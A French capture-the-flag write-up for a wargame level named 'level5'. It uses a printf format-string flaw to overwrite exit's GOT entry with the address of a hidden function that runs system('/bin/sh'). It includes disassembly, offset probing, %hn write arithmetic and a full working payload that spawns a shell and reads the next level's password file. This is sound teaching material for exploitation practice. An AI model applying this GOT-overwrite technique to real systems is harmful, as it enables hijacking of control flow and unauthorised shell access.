# level5

## Objectif

Exploiter le binaire `level5` pour obtenir un shell `level6` et lire
`/home/user/level6/.pass`.

Encore une faille de chaîne de format, mais cette fois **sans condition à
remplir** : on détourne l'appel à `exit` via la **GOT**.

## 1. Repérer la faille

`main` appelle `n` :

```asm
0x080484e5 <+35>:  call   0x80483a0 <fgets@plt>   ; fgets(buffer, 512, stdin)
0x080484ea <+40>:  lea    -0x208(%ebp),%eax
0x080484f0 <+46>:  mov    %eax,(%esp)
0x080484f3 <+49>:  call   0x8048380 <printf@plt>  ; printf(buffer)   <-- faille
0x080484f8 <+54>:  movl   $0x1,(%esp)
0x080484ff <+61>:  call   0x80483d0 <exit@plt>    ; exit(1)
```

**Différence avec level3/4 :** il n'y a **aucune condition** (`if (m == …)`)
derrière. Après le `printf`, le programme appelle directement `exit(1)`. Écrire
dans une globale ne servirait à rien → il faut une autre cible.

## 2. La cible : détourner `exit` via la GOT

Une fonction de la libc comme `exit` est appelée par indirection :

```asm
(gdb) disas exit
0x080483d0 <exit@plt+0>:  jmp    *0x8049838
```

`call exit@plt` saute vers l'adresse **stockée à `0x8049838`** (l'entrée GOT
d'`exit`). La GOT est **inscriptible** : si on remplace la valeur en `0x8049838`,
`call exit` sautera où l'on veut.

En faisant **`info functions`**:

```asm
0x08048334  _init
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
0x080485cc  _fini
```

On remarque qu'il existe une fonction cachée `o` qui ouvre un shell :

```asm
(gdb) disas o
0x080484a4 <o+0>:  ...
0x080484aa <+6>:   movl   $0x80485f0,(%esp)        ; "/bin/sh"
0x080484b1 <+13>:  call   0x80483b0 <system@plt>   ; system("/bin/sh")
```

`o` est à **`0x080484a4`**. **Plan : écrire `0x080484a4` dans `GOT[exit]`
(`0x8049838`)** → l'`exit(1)` final sautera dans `o` → shell.

## 3. Trouver la position de notre saisie

```sh
python -c 'print "AAAA" + ".%x"*10' | ./level5
```

```
AAAA.200.b7fd1ac0.b7ff37d0.41414141...
      (1)   (2)      (3)     (4)
```

`41414141` apparaît au **4ᵉ** → notre saisie commence à l'argument n°4.

## 4. Construire le payload

La valeur à écrire est une adresse : `0x080484a4` = 134 513 828. Trop grand pour
un seul `%n` (il faudrait afficher 134 Mo). On écrit donc l'adresse en **deux
moitiés de 16 bits** avec **`%hn`** (qui écrit 2 octets) :

```
0x080484a4  =  0x0804 (moitié haute)  |  0x84a4 (moitié basse)
```

- `0x0804` = 2052 → à écrire dans les 2 octets hauts → adresse `0x804983a`
- `0x84a4` = 33956 → à écrire dans les 2 octets bas  → adresse `0x8049838`

Relues en little-endian, ces 4 cases (`a4 84 04 08`) redonnent `0x080484a4`.

On place les deux adresses au début (positions 4 et 5), et on écrit la plus
petite valeur d'abord (le compteur ne fait que monter) :

| Étape | Affiché | Compteur | Action |
|---|---|---|---|
| 2 adresses (8 octets) | 8 | **8** | — |
| `%2044x` | +2044 | **2052** = `0x0804` | `%4$hn` → écrit en `0x804983a` (moitié haute) |
| `%31904x` | +31904 | **33956** = `0x84a4` | `%5$hn` → écrit en `0x8049838` (moitié basse) |

- `pad1 = 2052 − 8 = 2044`
- `pad2 = 33956 − 2052 = 31904`

## 5. Exécuter et récupérer le flag

```sh
(printf '\x3a\x98\x04\x08\x38\x98\x04\x08%%2044x%%4$hn%%31904x%%5$hn'; cat) | ./level5
```

Décomposition (les `%` sont doublés pour `printf`) :
- `\x3a\x98\x04\x08` → adresse `0x804983a` (position 4, recevra `0x0804`) ;
- `\x38\x98\x04\x08` → adresse `0x8049838` (position 5, recevra `0x84a4`) ;
- `%%2044x%%4$hn` → compteur à 2052, écrit la moitié haute ;
- `%%31904x%%5$hn` → compteur à 33956, écrit la moitié basse.

`GOT[exit]` vaut alors `0x080484a4` → `exit(1)` saute dans `o` → `system("/bin/sh")`.
Le `; cat` maintient l'entrée ouverte pour le shell interactif.

```sh
whoami                          # level6
cat /home/user/level6/.pass
```

Le mot de passe récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

Faille de chaîne de format sans condition de déclenchement : on exploite
`printf(buffer)` pour réécrire l'entrée GOT d'`exit` (redirection d'un pointeur
de fonction). L'adresse cible étant trop grande pour un `%n`, on l'écrit en deux
`%hn` de 16 bits. Quand le programme appelle `exit`, il exécute en réalité la
fonction `o` (`system("/bin/sh")`).
